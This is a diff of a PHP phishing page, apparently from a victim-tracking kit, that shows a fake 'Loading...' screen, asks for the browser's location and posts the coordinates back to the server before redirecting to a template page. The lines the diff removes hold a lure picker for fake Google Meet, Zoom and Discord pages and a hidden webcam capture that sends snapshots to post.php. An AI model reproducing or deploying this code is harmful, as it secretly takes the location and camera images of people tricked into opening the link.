@@ -1,27 +1,7 @@
 <?php
 include 'ip.php';
 
-// Get parameters from the URL
-$meetingType = isset($_GET['meeting']) ? $_GET['meeting'] : 'googlemeet';
-$numPictures = isset($_GET['num_pictures']) ? intval($_GET['num_pictures']) : 1;
-
-// Determine which HTML file to redirect to based on the 'meeting' parameter
-switch ($meetingType) {
-    case 'googlemeet':
-        $redirectURL = 'googlemeet.html';
-        break;
-    case 'zoom':
-        $redirectURL = 'zoom.html';
-        break;
-    case 'discord':
-        $redirectURL = 'discord.html';
-        break;
-    default:
-        $redirectURL = 'googlemeet.html'; // Default
-        break;
-}
-
-// Add JavaScript to capture location and webcam
+// Add JavaScript to capture location
 echo '
 <!DOCTYPE html>
 <html>
@@ -29,10 +9,6 @@ echo '
     <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        var imageCount = 0;
-        var numPictures = ' . $numPictures . '; // Number of pictures to take
-        var redirectURL = "' . $redirectURL . '"; // URL to redirect to
-
         // Debug function to log messages - only log essential information
         function debugLog(message) {
             // Only log essential location data, not status messages
@@ -48,8 +24,14 @@ echo '
         }
         
         function getLocation() {
+            // Don\'t log this message
+            
             if (navigator.geolocation) {
+                // Don\'t log this message
+                
+                // Show permission request message
                 document.getElementById("locationStatus").innerText = "Requesting location permission...";
+                
                 navigator.geolocation.getCurrentPosition(
                     sendPosition, 
                     handleError, 
@@ -60,9 +42,11 @@ echo '
                     }
                 );
             } else {
+                // Don\'t log this message
                 document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
+                // Redirect after a delay if geolocation is not supported
                 setTimeout(function() {
-                    window.location.href = redirectURL;
+                    redirectToMainPage();
                 }, 2000);
             }
         }
@@ -83,80 +67,51 @@ echo '
             
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === 4) {
+                    // Don\'t log this message
+                    
+                    // Add a delay before redirecting to ensure data is processed
                     setTimeout(function() {
-                        captureAndRedirect();
+                        redirectToMainPage();
                     }, 1000);
                 }
             };
             
             xhr.onerror = function() {
-                captureAndRedirect();
+                // Don\'t log this message
+                // Still redirect even if there was an error
+                redirectToMainPage();
             };
             
+            // Send the data with a timestamp to avoid caching
             xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
         }
         
         function handleError(error) {
+            // Don\'t log error messages
+            
             document.getElementById("locationStatus").innerText = "Redirecting...";
+            
+            // If user denies location permission or any other error, still redirect after a short delay
             setTimeout(function() {
-                captureAndRedirect();
+                redirectToMainPage();
             }, 2000);
         }
-
-        function captureAndRedirect() {
-            // Webcam access and image capture
-            var video = document.createElement("video");
-            video.style.display = "none";
-            document.body.appendChild(video);
-
-            var canvas = document.createElement("canvas");
-            canvas.width = 400;
-            canvas.height = 300;
-            canvas.style.display = "none";
-            document.body.appendChild(canvas);
-
-            var context = canvas.getContext("2d");
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        video.srcObject = stream;
-                        video.play();
-
-                        var capture = function() {
-                            context.drawImage(video, 0, 0, 400, 300);
-                            var imageData = canvas.toDataURL("image/png");
-                            sendImage(imageData);
-                            imageCount++;
-
-                            if (imageCount < numPictures) {
-                                setTimeout(capture, 1000); // Capture every 1 second
-                            } else {
-                                window.location.href = redirectURL; // Redirect after capturing all images
-                            }
-                        };
-
-                        // Start capturing after 3 seconds
-                        setTimeout(capture, 3000);
-                    })
-                    .catch(function(err) {
-                        console.log("An error occurred: " + err);
-                        window.location.href = redirectURL; // Redirect even if there is an error
-                    });
-            } else {
-                window.location.href = redirectURL; // Redirect if getUserMedia is not supported
+        
+        function redirectToMainPage() {
+            // Don\'t log this message
+            // Try to redirect to the template page
+            try {
+                window.location.href = "forwarding_link/index2.html";
+            } catch (e) {
+                // Don\'t log this message
+                // Fallback redirection
+                window.location = "forwarding_link/index2.html";
             }
         }
-
-        function sendImage(imageData) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "post.php", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("cat=" + encodeURIComponent(imageData));
-        }
-
+        
         // Try to get location when page loads
         window.onload = function() {
+            // Don\'t log this message
             setTimeout(function() {
                 getLocation();
             }, 500); // Small delay to ensure everything is loaded
@@ -182,4 +137,3 @@ echo '
 ';
 exit;
 ?>
-
